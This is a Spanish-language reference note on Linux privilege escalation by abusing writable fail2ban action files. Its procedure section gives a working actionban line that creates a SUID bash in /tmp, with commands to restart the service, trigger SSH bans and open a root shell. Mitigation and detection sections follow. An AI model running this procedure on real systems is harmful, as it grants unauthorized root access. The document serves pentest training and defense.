---
topic: Escalada por fail2ban
tags: [linux, privesc, fail2ban, sudo, systemd]
---

# Escalada por fail2ban

[🇬🇧 English](fail2ban-privesc.en.md) | **Español**

## Concepto

`fail2ban` monitoriza logs y ejecuta una **action** cuando una IP supera el número de fallos permitido. La acción se define en `/etc/fail2ban/action.d/*.conf`, en la variable `actionban`, y se ejecuta con los privilegios del servicio (normalmente root). Si un usuario puede escribir en `action.d` y reiniciar el servicio, puede convertir un baneo en ejecución como root.

## Cuándo aplica

- `sudo -l` permite reiniciar `fail2ban` o el servicio corre como root.
- El usuario pertenece a un grupo propietario de `action.d` o de un fichero de acción.
- Existe un jail activo que dispare `actionban` (por ejemplo, `sshd`).

## Requisitos y condiciones

1. Permiso para modificar `action.d` o un `.conf` incluido.
2. Capacidad de reiniciar/reload `fail2ban` con privilegios.
3. Un evento que provoque el baneo (fallos SSH, HTTP, etc.).
4. Conocer qué acción usa el jail (`iptables-multiport`, `nftables`, etc.).

## Procedimiento

```bash
sudo -l
find / -group <GROUP> -writable 2>/dev/null
ls -ld /etc/fail2ban/action.d
```

Se identifica la acción del jail:

```bash
grep -R "banaction\|actionban" /etc/fail2ban/jail.conf /etc/fail2ban/jail.local 2>/dev/null
```

Se reemplaza `actionban` por una orden que cree un binario SUID:

```text
actionban = cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
```

Se reinicia el servicio y se provocan los fallos necesarios:

```bash
sudo /etc/init.d/fail2ban restart
for i in $(seq 1 6); do ssh baduser@<IP>; done
/tmp/rootbash -p
```

## Variantes

- **Acción `nftables`/`iptables`**: cambia el nombre del fichero, pero el principio es el mismo.
- **Fichero `.local`**: si el usuario puede escribir en `jail.local`, puede definir una acción propia.
- **Reload en lugar de restart**: algunos permisos de `sudo` permiten `fail2ban-client reload`; también recarga la configuración.
- **Baneo HTTP**: un jail de Nginx/Apache puede dispararse con peticiones maliciosas sin tocar SSH.

## Limitaciones

- El baneo debe ocurrir; si el jail está deshabilitado, no se ejecuta la acción.
- El path del binario y el usuario del servicio deben permitir la escritura.
- Un `actionban` mal formado puede romper `fail2ban`; se prueba en local.
- La shell resultante conserva el euid, pero no necesariamente el uid; `bash -p` es importante.

## Mitigación

- No dar a usuarios normales escritura sobre `/etc/fail2ban` ni permisos de restart.
- Usar `fail2ban-client` con un wrapper restringido y validar la configuración.
- Monitorizar la integridad de `action.d` y de `jail.local`.
- Ejecutar `fail2ban` con el mínimo privilegio posible y separar jails por servicio.

## Detección

- Cambios en `action.d`/`jail.local` y reinicios de `fail2ban` fuera de ventana.
- Aparición de binarios SUID en `/tmp`, `/var/tmp` o `/dev/shm`.
- Ráfagas de fallos de autenticación desde una misma IP justo después de un cambio de configuración.
- `auditd` sobre `action.d` y sobre `execve` de `cp`/`chmod` desde el usuario del servicio.

MITRE ATT&CK: T1548.001 (Setuid and Setgid), T1543.002 (Systemd Service), T1562.001 (Impair Defenses).

## Referencias

- <https://github.com/fail2ban/fail2ban/wiki>
- <https://manpages.debian.org/bookworm/fail2ban/fail2ban.conf.5.en.html>
- <https://attack.mitre.org/techniques/T1548/001/>
